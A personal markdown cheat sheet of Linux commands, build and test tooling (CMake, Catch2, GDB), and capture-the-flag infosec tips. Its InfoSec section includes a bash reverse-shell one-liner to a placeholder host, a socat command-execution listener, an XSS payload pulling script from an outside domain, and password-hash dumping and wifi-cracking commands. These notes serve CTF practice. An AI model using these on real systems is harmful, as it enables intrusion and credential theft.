---
title: The One Note
subtitle: Tips and tricks on computer
author: João Fukuda
---

* [Linux](#linux)
* [InfoSec](#infosec)
* [Programming](#programming)

# Linux

Programs list:

* sort
* uniq
* tr
* rev
* echo
* bc
* gnuplot
* xargs
* convert
* gnuplot

## entr

Checks for changes in files passed through stdin

Run a command when a file changes:
```bash
ls src/* | entr <cmd> # No quotes needed
```

## awk

Work with tables and column outputs in Linux.

* from [here](https://www.youtube.com/watch?v=sz_dsktIjt4)

Print only second column
```bash
awk '{print $2}'
```

Match and Regex
```bash
# First column equals '1' and second matches regex
awk '$1 == 1 && $2 ~ /^c.*e$/ {print $0}'
```

Count number of lines
```bash
# First column equals '1' and second matches regex
awk 'BEGIN { rows = 0 }$1 == 1 && $2 ~ /^c.*e$/ { rows += 1 } END {print rows}'
```

## openssl

Sym key encrypt/decrypt file
```bash
# Encrypt
openssl aes-256-cbc -salt -in file -out encfile

# Decrypt
openssl aes-256-cbc -d -in encfile -out file
```

Netcat through SSL
```bash
openssl s_client -connect address:port -nbio
```

## sed

Substitute editor

`-E`{bash} for Perl's regex syntax.

Replace first
```sed
s/find/replace/
```

Replace all
```sed
s/find/replace/g
```

Delete line
```sed
/find/d
```

Show first `10` lines
```sed
10q
```

Edits document in-place
```bash
sed -i 's/<pattern>/<subst>/'
```

Use the matching group
```bash
sed -E 's/(patt1) (patt2)/\2/' # replaces \2 with `patt2`'s match
```

Use non greedy match instead of getting the biggest possible match
```bash
# ? after * or +
sed -E 's/.*?\s//'
```

Ignore group matching for matches inside `()`
```bash
# (?:<pattern>)
sed -E 's/(?:.*)//'
```

## paste

Format lines of output

Get lines from stdin and print delimited by comma
```bash
paste -sd,
```

## ffmpeg

Formats and converts raw video and image data

Get photo from webcam to `feh`
```bash
ffmpeg -i /dev/video0 -frames 1 -f image2 - | feh -
```

Get video from webcam to `vlc`
```bash
ffmpeg -i /dev/video0 -f mpegts - | vlc -
```

## make

Don't echo command
```make
all:
	@echo Something
```

Makes with dependencies. Runs only **if** the dependency change
```make
target.pdf: target.md dep1.png
	pandoc -o target.pdf target.md

dep1.png: dep1.plt
	gnuplot dep1.plt
```

Pattern matching. Swaps `$*` for whatever was matched by the wildcard `%` and `$@` by the target
```make
target.pdf: target.md plot-dep.png
	pandoc -o target.pdf target.md

plot-%.png: %.plt
	gnuplot $*.plt -o $@
```

## Tmux

### Simple named session

```bash
tmux -s session_name
```

### Shared session

```bash
tmux new -s alice
```

And

```bash
tmux a -t alice
```

### Independent window sharing

```bash
tmux new -s alice
```

And

```bash
tmux new -s bob -t alice
```


# InfoSec

## Links

### Infos

* [CTFTime](https://ctftime.org/)
* [CTF101](https://ctf101.org/)

### Challenges

* [Crackmes.one](https://crackmes.one/)
* [CryptoHack](https://cryptohack.org/)
* [Cryptopals](https://cryptopals.com/)
* [VulnHub](https://www.vulnhub.com/)
* [Exploit Education](https://exploit.education/)
* [HackTheBox](https://www.hackthebox.eu/)
* [HackThisSite](https://www.hackthissite.org/)
* [Lord of SQL Injection](https://los.rubiya.kr/)
* [Metasploitable](https://docs.rapid7.com/metasploit/metasploitable-2/)
* [Microcorruption](https://microcorruption.com/login)
* [OverTheWire - Bandit](https://overthewire.org/wargames/bandit)
* [OverTheWire - Natas](https://overthewire.org/wargames/natas)
* [PicoCTF](https://www.picoctf.org/)
* Pwnable.{xyz,kr,tw}
* [RingZer0](https://ringzer0ctf.com/)
* [ROP Emporium](https://ropemporium.com/)
* [SANS Holiday Hack Challenges](https://holidayhackchallenge.com/)
* [SmashTheStack](http://smashthestack.org/)
* [TryHackMe](http://tryhackme.com/)

## General

### Hash Cracking

* [crackstation](https://crackstation.net/)
* john
* hashcat
* hashid
* haiti

## Web

* sublist3r

### Links

* [requestcatcher.com](https://requestcatcher.com/)
* [requestbin.net](https://requestbin.net/)

### curl

Get verbose request
```bash
curl -v url
```

Make post request
```bash
curl -X POST url
# or
curl -d data url
```
> Hint:
>
> -d could be `cat file`

### wget

Crawler
```bash
wget --spider -r -nv --level {0,N} -e robots=off url
```

### XSS

14.rs
```html
<script src="//14.rs"></script>
```

## Binary Exploit

* Ghidra

### Radare2

Enter with analysis on
```bash
r2 -AA <file>
```

### Visual mode

#### Enter Panel Mode
```
> v<CR>
```

#### On Panel Mode
* `<space>`
: Enter Graph Mode
* `<enter>`
: Zoom current panel
* `_`
: List/Goto symbols
* `\`
: Possible commands (One useful option is in 'edit > asm.pseudo')
* `!`
: Simple assembly visualization
* `b`
: Browse stuff
* `w`
: Window Mode

#### On Window Mode
* `X`
: Close window

#### On Graph Mode
* `q`
: Exit Graph Mode
* `<space>`
: Exit Graph Mode
* `_`
: List/Goto symbols
* `-`
: Zoom Out
* `+`
: Zoom In
* `0`
: Default Zoom

## Forensics

### Steganography

* exiftool
* steghide - jpeg
* zsteg - png, bmp
* stegcracker
* stegoveritas - auto image filtering

### XXD

Read file in binary:
```bash
xxd file
```

Revert from hexdump to a file:
```bash
xxd -r -p dump output_file
```

### Binwalk

Extract:
```bash
binwalk -e file
```

Hard extract:
```bash
binwalk --dd='.*' -M file
```

### Volatility

Memory dump tool

Check dump profile
```bash
volatility -f file imageinfo
```

Get console log
```bash
volatility -f file --profile=<profile> consoles
```

Get processes list
```bash
volatility -f file --profile=<profile> {pstree,psscan}
```

Hash dump
```bash
volatility -f file --profile=<profile> hashdump
```

## Networking

* Nikto

### Socat

Run a command through a TCP connection:
```bash
socat tcp-listen:<port>,fork,reuseaddr 'exec:<cmd>'
```

### Rev Shell

```bash
bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'
```

For better performance, use `pwncat` to listen

### Aircrack-ng suite

Crack wifi passwords from `.pcap` files
```bash
aircrack-ng file wordlist
```

### tshark

Filter outputs
```bash
tshark -r file -Y filter

# Useful filters:
#
# ip.{addr,src,dst}
# http[.method]
# tcp[.{port,src,dst}]
# frame.number
```

Get files (or use tcpflow)
```bash
# prot (transport protocol): tcp, udp, tls, http2, quic
# mode (output): ascii (ascii + '.' as non-print), ebcdic, hex (hexa + ascii), raw (hexa)
# filter (which flow to follow): index, ip + port pair
tshark -r file -z follow,prot,mode,filter[,range]

# Example:
tshark -r file -z "follow,tcp,ascii,200.57.7.197:32891,200.57.7.198:2906"
```


# Programming

## Versioning

#### Lock files

Locks dependency versions

#### Vendering

Put the dependencies **inside** your project and ship program with it

### Semantic version number

```
8.1.7
^ ^ ^
| | +-> patch
| +---> minor
+-----> major
```

#### Increment

* Patch:
: **Entirely** backwards compatible version (ex.: security patches)
* Minor:
: New functions
* Major:
: Backwards **incompatible** change

## Testing

#### Unit test

Small tests for unique functions

#### Integration test

Test integration of multiple subsystem

#### Regression test

Test something that was broken before to prevent its reintroduction

#### Mocking

Replace parts of code to simulate a simpler environment

## Catch2

C++ unit testing library

Compile and run like this (with cmake):

CMakeLists.txt
```cmake
# ...
find_package(Catch2 REQUIRED)
add_executable(test test/main.cpp)
target_link_libraries(test Catch2Main Catch2)
```

test/main.cpp
```cpp
#include <catch2/catch_all.hpp>
// ...
```

### REQUIRE & CHECK

When REQUIRE fails, the tests abort
```cpp
REQUIRE( f() == 42 );
```

When CHECK fails, the tests continue
```cpp
CHECK( f() == 42 );
```

### REQUIRE_THAT & CHECK_THAT

Adds a second argument, a matcher.

Tests if the test matches the matcher
```cpp
REQUIRE_THAT( f(), Equals(42) )
REQUIRE_THAT( get_string(), Contains("banana") )
REQUIRE_THAT( get_string(), StartsWith("ba") )
REQUIRE_THAT( get_string(), EndsWith("ana") )
REQUIRE_THAT( get_vector(), VectorContains(9) )
REQUIRE_THAT( get_vector(), ( VectorContains(2) || VectorStartsWith(4) ) && Contains(3) )
```

Define custom matchers for your classes:
```cpp
class CustomMatcher : public Catch::MatcherBase<ClassToMatch>
{
	private:
		int m_expected;

	public:
		explicit CustomMatcher(int to_match) :
			m_expected(to_match)
		{}
		bool match(const ClassToMatch& other) const override
		{
			return m_expected == other.value;
		}

		std::string describe() const override
		{
			return "Custom class is equals to other";
		}
};

TEST_CASE()
{
	REQUIRE_THAT(ClassToMatch(), CustomMatcher(3));
}
```

Sections inside test cases:
```cpp
TEST_CASE()
{
	SECTION()
	{
		REQUIRE();
		// ...
	}
}
```

Generate test cases:
```cpp
TEST_CASE()
{
	int x = GENERATE(range(1, 11));
	int y = GENERATE(range(101, 111));

	REQUIRE(x < y);
}

TEST_CASE()
{
	auto s = GENERATE(as<std::string>(), "a", "b", "c"); // as keeps s from being a char*

	REQUIRE_THAT(banana(), Contains(s));
}

TEST_CASE()
{
	auto [input, expected_output] = GENERATE( values<std::pair<int, std::string>>({
		{3, "three"},
		{6, "six"},
		{1, "one"},
		{9, "nine"}
	}));

	REQUIRE(to_string(input) == expected_output);
}

TEST_CASE()
{
	auto [input, expected_output] = GENERATE( table<int, std::string>({
		{3, "three"},
		{6, "six"},
		{1, "one"},
		{9, "nine"}
	}));

	REQUIRE(to_string(input) == expected_output);
}

TEST_CASE()
{
	auto [start, eat, left] = GENERATE( table<int, int, int>({
		{3, 2, 1},
		{12, 0, 12},
		{6, 6, 0},
		{1, -1, 2},
		{9, 10, -1}
	}));

	GIVEN("There are " << start << " bananas")
	WHEN("I eat " << eat << " bananas")
	THEN("I should have " << left << " bananas") {
		REQUIRE(eat_bananas(start, end) == left);
	}
}
```

## git

* folder
: is a tree
* file
: is a blob

```
[S1]---[S2]---[S3]---[S5]
          \          /
           ---[S4]---
```

`[S5]` is a merge of both `[S3]` and `[S4]`

All States have metadata such as author and message

Beautiful `git log`
```bash
git log --all --graph --decorate --oneline
```

Check what **any** hash means
```bash
git cat-file -p <hash>
```

## CMake

#### Directories

Need to have a `CMakeLists.txt` file.

They can be added with the CMake command `add_subdirectory()`.

#### Scripts

```bash
cmake -p <script>.cmake
```

#### Modules

`<script>.cmake` on `CMAKE_MODULE_PATH`

Can be loaded with `include()`

### Syntax

#### Command

```cmake
command_name(space separated list of arguments)
```

It can:

* set variables
* change behavior of other commands

### Variables

Expand to an empty string when not set

```cmake
set(hello world)
message(STATUS "Hello, ${hello}")
```

#### Useful variables

* `CMAKE_CURRENT_SOURCE_DIR`

### Comments

```cmake
# Single line

#[==[
	Multi line comment
	#[=[
		These can be nested
	#]=]
#]==]
```

Inserting an additional `#` to the beginning of a multi-line comment disables that nest

### Custom commands

Added with `function()` or `macro()`

Old definitions of commands can be accessed with a `_` prefix

#### Example

```cmake
function(custom_cmd this that)
	# ...
	set(${this} ... PARENT_SCOPE) # global variable instead of local IF exists
endfunction()
custom_cmd(bana na)
```

There are these variables in custom_cmd scope: `this`, `that`, `ARGC`, `ARGV`, `ARGN`, `ARG0` and `ARG1`.

### Targets

#### Constructors

* `add_executable()`
* `add_library()`

#### Member variables

Target properties

#### Member functions

* `get_target_property()`
* `set_target_property()`
* `get_property(TARGET)`
* `set_property(TARGET)`
* `target_compile_definitions()`
* `target_compile_features()`
* `target_compile_options()`
* `target_include_directories()`
* `target_link_libraries()`
* `target_sources()`

Choose these instead of the ones above:

* `add_compile_options()`
* `include_directories()`
* `link_directories()`
* `link_libraries()`

```cmake
target_compile_features(Foo
	PUBLIC
		cxx_string_enums
	PRIVATE
		cxx_lambdas
		cxx_range_for
)
```

## Debugging

### GDB

#### Running
* `file`
: load file symbols
* `r`
: start new debug session
* `stepi`
: start and stop at the first instruction of the program
* `s`
: step (also step inside function calls)
* `n`
: step (skip function calls)
* `c`
: continue running until end of program or breakpoint

#### Breakpoints
* `b <lineNum>|*<instructionAddr>[+<offsetNum>] [if <condition>]`
: set breakpoint
* `i b`
: list breakpoints
* `d [breakpointID]`
: delete breakpoint (if no breakpoint, delete all breakpoints)

#### Var
* `p (<expression>|*<arr>@<len>)`
: prints the expression or array `<arr>` of length `<len>`
* `whatis <var>`
: check type of `<var>`
* `i local`
: list local variables
* `i args`
: list current function args
* `watch <expression> [if <condition>]`
: watch expression and everytime the expression changes, the execution stops
* `rwatch <expression> [if <condition>]`
: everytime the expression is read, the execution stops
* `set args <arg>...`
: set args of current frame to `<arg>...`
* `set var <var> <value>`
: set `<var>` to `<value>`

#### Recording
* `record`
: records the execution and allows for reverse commands
* `reverse-continue`
: same as normal, but in reverse
* `reverse-stepi`
: same as normal, but in reverse
* `reverse-step`
: same as normal, but in reverse
* `reverse-nexti`
: same as normal, but in reverse
* `reverse-next`
: same as normal, but in reverse

#### Misc
* `disas [<symbol>]`
: disassembles <symbol> (or current frame)
* `x/[<N>](x|s|i) *<address>`
: show `<N>` objects (x: hex, s: strings, i: instructions) stored on address `<address>`
* `refresh/ctrl-l`
: redraws the screen
* `ctrl-x-a`
: toggle from/to tui mode
* `ctrl-x-2`
: visual window modes
* `set print pretty on`
: help print structures
* `set disassembly- intel`
: set better asm style
* `command <breakpointID> [<command>]`
: register command `<command>` (or commands passed as stdin) to run when breakpoint is hit
